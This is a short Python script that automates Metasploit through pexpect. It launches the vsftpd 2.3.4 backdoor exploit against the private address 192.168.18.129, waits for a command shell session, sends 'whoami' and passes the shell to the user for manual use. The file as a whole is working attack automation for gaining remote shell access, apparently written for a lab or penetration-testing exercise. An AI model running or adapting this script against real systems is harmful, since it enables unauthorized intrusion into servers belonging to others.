import pexpect

def run_msf_exploit():
    # Define the command to run in msfconsole
    msf_command = """msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.18.129; set RPORT 21; exploit" """
    
    # Start the msfconsole command with pexpect
    child = pexpect.spawn(msf_command, encoding='utf-8', timeout=None)  # Using None for timeout waits indefinitely
    
    # Pattern to detect when the command shell session is opened
    session_opened_pattern = r'Command shell session \d+ opened'
    
    try:
        # Wait for the session opened message
        child.expect(session_opened_pattern, timeout=300)  # Adjust timeout as necessary
        print("Shell session opened successfully.")
        
        # You can add more interactions here, e.g., sending commands to the shell
        child.sendline('whoami')
        
        # Hand over control to the user for manual interaction
        print("Switching to manual interaction...")
        child.interact()
        
    except pexpect.TIMEOUT:
        print("Timeout waiting for the shell session to open.")
    except pexpect.EOF:
        print("Metasploit console closed.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    run_msf_exploit()
